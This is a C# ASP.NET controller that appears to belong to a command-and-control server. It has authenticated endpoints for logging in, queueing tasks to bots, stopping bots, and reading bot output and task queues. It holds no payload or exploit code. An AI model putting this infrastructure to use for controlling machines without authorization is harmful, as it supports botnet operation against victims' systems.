using C2.Models;
using C2.POCOs;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Cors;
using Microsoft.AspNetCore.Mvc;
using System.Collections.Concurrent;

namespace C2.Controllers;

[ApiController]
[Route("[controller]")]
public class ManagementController : AbstractController
{
    [HttpPost]
    [ProducesResponseType(typeof(string), 200)]
    public IActionResult Login([FromBody] UserId userId)
    {
        return UserManager.ValidateUser(userId.Username, userId.Password)
            ? Ok(UserManager.GenerateAuthorizationToken(userId.Username))
            : Unauthorized();
    }

    [Authorize]
    [HttpGet("ManagementTest")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult ManagementTest() => Ok();

    [Authorize]
    [HttpPost("QueueTask")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult QueueTask([FromBody] AddedBotTask task)
    {
        for (int i = 0; i < task.Count; i++)
        {
            C2State.TaskManager.QueueBotTask(task.Task, task.TaskParameters);
        }

        return Ok();
    }

    [Authorize]
    [HttpGet("StopBot")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult StopBot([FromQuery] int bot_id)
    {
        BotClient bot = GetBot(bot_id);

        bot.StopRequested = true;

        return Ok();
    }

    [Authorize]
    [HttpGet("GetBotInfo")]
    [ProducesResponseType(typeof(BotInfoPoco), StatusCodes.Status200OK)]
    public IActionResult GetBotInfo([FromQuery] int bot_id)
    {
        BotClient bot = GetBot(bot_id);

        var BotInfo = new BotInfoPoco()
        {
            Bot = bot,
            Task = C2State.TaskManager.GetTask(bot.TaskId)
        };

        bot.OutputRetrieved = true;

        return Ok(BotInfo);
    }

    [Authorize]
    [HttpGet("GetBotManager")]
    [ProducesResponseType(typeof(BotManager), StatusCodes.Status200OK)]
    public IActionResult GetBotManager() => Ok(C2State.BotManager.Bots);

    [Authorize]
    [HttpGet("GetBots")]
    [ProducesResponseType(typeof(StrippedBotList), StatusCodes.Status200OK)]
    public IActionResult GetBots()
    {
        var bots = new StrippedBotList();
        foreach (var bot in C2State.BotManager.Bots.Values)
        {
            bots.Bots.Add(new StrippedBot() { Id = bot.Id, Name = bot.Name });
        }

        return Ok(bots);
    }

    [Authorize]
    [HttpGet("GetWaitingTasks")]
    [ProducesResponseType(typeof(ConcurrentQueue<BotTask>), StatusCodes.Status200OK)]
    public IActionResult GetWaitingTasks() => Ok(C2State.TaskManager.Waiting);

    [Authorize]
    [HttpGet("GetExecutingTasks")]
    [ProducesResponseType(typeof(ConcurrentDictionary<int, BotTask>), StatusCodes.Status200OK)]
    public IActionResult GetExecutingTasks() => Ok(C2State.TaskManager.Executing);

    [Authorize]
    [HttpGet("GetCompletedTasks")]
    [ProducesResponseType(typeof(ConcurrentBag<BotTask>), StatusCodes.Status200OK)]
    public IActionResult GetCompletedTasks() => Ok(C2State.TaskManager.Completed);

}
